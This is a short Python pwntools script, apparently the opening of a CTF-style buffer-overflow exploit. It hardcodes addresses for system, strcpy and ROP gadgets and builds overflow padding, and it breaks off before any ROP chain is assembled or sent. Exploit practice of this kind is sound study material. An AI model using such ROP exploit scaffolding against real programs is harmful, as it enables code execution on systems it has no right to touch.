import sys
from pwn import *

s_address = 0x400476
h_address = 0x401034
write_to = 0x404038
system = 0x401084
strcpy = 0x401074
ret = 0x40101a
pop_rdi_ret = 0x4012c3
pop_rsi_pop_r15_ret = 0x4012c1
dummy = b'C' * 8

buf = b'A' * 208
buf += b'\x42' * 8